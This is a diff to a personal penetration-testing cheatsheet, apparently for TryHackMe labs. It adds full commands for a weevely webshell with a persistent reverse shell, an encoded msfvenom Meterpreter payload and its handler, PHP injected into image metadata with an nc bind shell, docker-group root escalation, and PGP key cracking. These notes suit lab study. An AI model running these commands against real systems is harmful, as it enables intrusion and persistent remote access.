@@ -20,13 +20,15 @@ eg. `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Comm
 
 ### find SUID binaries unprivileged
 
-`find / -user root -perm /4000 2>/dev/null`
+`find / -user root -perm /4000 2>/dev/null` for SUID binaries owned by root
+
+`find / -perm -u=s 2>/dev/null` for SUID binaries owned by any user
 
 usually suffices to find SUID binaries (does not use sudo - eg. sudo -l )
 
 ### gobuster no tls verification - just disable it
 
-`gobuster dir -u https://bricks.thm -w /usr/share/wordlists/dirb/common.txt -x .js,.php,.txt -k`
+`gobuster dir -u https://bricks.thm -w /usr/share/wordlists/dirb/common.txt -x js,php,txt -k`
 
 ### ftp get all files
 
@@ -93,9 +95,11 @@ try `/var/www/html` to find some config files
 just copy the revshells.com python#2 shell and format it normally
 (I can't put it here as it would get flagged as malware)
 
-### AD cheatsheet (not mine)
+### very cool cheatsheet for AD (not mine)
 
-[AD cheatsheet](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
+[ultra comprehensive AD cheatsheet](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
+
+hope they make more of these, it's that good stuff
 
 ### RDP
 
@@ -111,4 +115,107 @@ else, feel its wrath and a cold presence will form behind your back. Do not look
 anyways . . .
 
 
+### kali stuff
 
+`cd /` to go to root directory and `cd ~` to go to home directory
+
+`cd /usr/share && ls` here are most of your tools (+ wordlists)
+ - eg. `/usr/share/wordlists/`, `/usr/share/webshells/`
+
+### weird escalation vectors
+
+forget `sudo -l` and `find -perm -u=s 2>/dev/null`
+
+`id` - weird groups - eg. if you find `docker` you can get free root (GTFObins - search docker, if the 'alpine' thing is not found, replace it with 'bash')
+
+### weevely
+
+`man weevely` - weaponized webshells
+
+`weevely generate bedbug wish.php` - generates a webshell called wish.php with password bedbug
+
+`cat wish.php` - you see it's hard to read
+
+usage:
+ - upload it to the target (web)
+ - `weevely http://TARGET_IP/wish.php bedbug` - connect to the webshell
+ - `:help` - see all commands
+ - `:system_info`
+ - `:backdoor_reversetcp TARGET_IP 4444` - reverse shell, persistent, catch it with `nc -lp 4444`
+
+### msfvenom
+
+generate the shell:
+
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -e x86/shikata_ga_nai -f exe > shell.exe`
+
+there are many more formats (-p), eg.
+ - python/meterpreter/reverse_tcp
+ - java/jsp_shell_reverse_tcp (for .jsp webshells)
+
+
+upload it and `chmod +x shell.exe` to make it executable
+
+
+catch the shell:
+
+`msfconsole`
+
+`use exploit/multi/handler` - same for any format
+
+`set payload windows/meterpreter/reverse_tcp` - has to be the same as the one generated
+
+`set lhost YOUR_IP`
+
+`set lport YOUR_PORT`
+
+`run`
+
+### jhead
+
+inject php into an image as metadata
+
+usage steps:
+
+```
+
+jhead -purejpg myimage.jpg #removes all metadata
+
+jhead -ce myimage.jpg #shows all metadata for editing
+
+#now we remove the comment and add our code
+
+#rename the file to something.php
+
+mv myimage.jpg myimage.php.jpg
+
+#upload it and access it like this (to execute )
+
+http://TARGET_IP/myimage.php.jpg?cmd=nc -lvnp 2222 -e /bin/bash
+
+nc -lvnp 2222 #to catch it
+```
+
+### installing python packages on kali (pain)
+
+I use uv tool to manage packages
+
+[basic uv cheatsheet](`https://0xdf.gitlab.io/cheatsheets/uv`)
+
+### AD
+
+basic commands in my writeup: `Cybersec/THM_JR_Penetration_Tester/AD-Basic+Authenticated_Enumeration.md`
+
+[AD enum writeup link]('https://frajer.gitbook.io/tryhackme/cybersec/thm_jr_penetration_tester/ad-basic+authenticated_enumeration')
+
+### leaked pgp key
+
+in this case we found ***tryhackme.asc***, which is a pgp key and we have ***credential.pgp*** that's been encrypted with it.
+
+`gpg2john tryhackme.asc > pgp_hash.txt` - make it johnable
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt pgp_hash.txt` - crack it
+
+`gpg --import tryhackme.asc` - import the key
+
+`gpg --decrypt credential.pgp` - decrypt by entering the password
